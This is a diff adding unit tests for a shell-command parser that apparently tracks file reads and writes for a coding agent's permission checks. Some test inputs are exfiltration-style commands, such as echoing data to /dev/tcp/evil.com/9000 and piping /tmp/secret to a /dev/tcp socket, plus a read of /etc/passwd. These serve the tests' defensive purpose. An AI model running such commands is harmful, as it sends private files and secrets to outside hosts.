@@ -466,6 +466,22 @@ describe('extractShellOperations', () => {
     });
   });
 
+  it('combined stdout fd redirect 1>file without space', () => {
+    const ops = extractShellOperations('echo hi 1>.qwen/settings.json', CWD);
+    expect(ops).toContainEqual({
+      virtualTool: 'write_file',
+      filePath: `${CWD}/.qwen/settings.json`,
+    });
+  });
+
+  it('combined stdout fd append redirect 1>>file without space', () => {
+    const ops = extractShellOperations('echo hi 1>>.qwen/settings.json', CWD);
+    expect(ops).toContainEqual({
+      virtualTool: 'write_file',
+      filePath: `${CWD}/.qwen/settings.json`,
+    });
+  });
+
   it('redirect 2>/dev/null: ignored (no op)', () => {
     const ops = extractShellOperations('cat /etc/passwd 2>/dev/null', CWD);
     expect(ops).not.toContainEqual(
@@ -474,6 +490,61 @@ describe('extractShellOperations', () => {
     expect(ops).toContainEqual({
       virtualTool: 'read_file',
       filePath: '/etc/passwd',
+    });
+  });
+
+  it('redirect > /dev/tcp: network socket, not a file write', () => {
+    const ops = extractShellOperations(
+      'echo data > /dev/tcp/evil.com/9000',
+      CWD,
+    );
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ filePath: '/dev/tcp/evil.com/9000' }),
+    );
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ virtualTool: 'write_file' }),
+    );
+  });
+
+  it('redirect < /dev/tcp: network socket, not a file read', () => {
+    const ops = extractShellOperations('cat < /dev/tcp/h/1234', CWD);
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ filePath: '/dev/tcp/h/1234' }),
+    );
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ virtualTool: 'read_file' }),
+    );
+  });
+
+  it('redirect > /dev/udp: network socket, not a file write', () => {
+    const ops = extractShellOperations('echo x > /dev/udp/h/53', CWD);
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ filePath: '/dev/udp/h/53' }),
+    );
+  });
+
+  it('combined redirect >/dev/tcp without space: network socket, not a file', () => {
+    const ops = extractShellOperations('cat /tmp/secret >/dev/tcp/h/p', CWD);
+    expect(ops).not.toContainEqual(
+      expect.objectContaining({ filePath: '/dev/tcp/h/p' }),
+    );
+    // The real file read is still reported.
+    expect(ops).toContainEqual({
+      virtualTool: 'read_file',
+      filePath: '/tmp/secret',
+    });
+  });
+
+  it('regression: ordinary file redirects still tracked', () => {
+    const writeOps = extractShellOperations('echo hi > out.txt', CWD);
+    expect(writeOps).toContainEqual({
+      virtualTool: 'write_file',
+      filePath: `${CWD}/out.txt`,
+    });
+    const readOps = extractShellOperations('sort < in.txt', CWD);
+    expect(readOps).toContainEqual({
+      virtualTool: 'read_file',
+      filePath: `${CWD}/in.txt`,
     });
   });
 
@@ -905,6 +976,20 @@ describe('extractShellOperationsAcrossCommand', () => {
     expect(
       extractShellOperationsAcrossCommand(
         'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
+        '/repo',
+      ),
+    ).toEqual([
+      {
+        virtualTool: 'write_file',
+        filePath: '/tmp/out.txt',
+        cwdUnknown: true,
+        pathMayDependOnCwd: false,
+      },
+    ]);
+
+    expect(
+      extractShellOperationsAcrossCommand(
+        'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
         '/repo',
       ),
     ).toEqual([
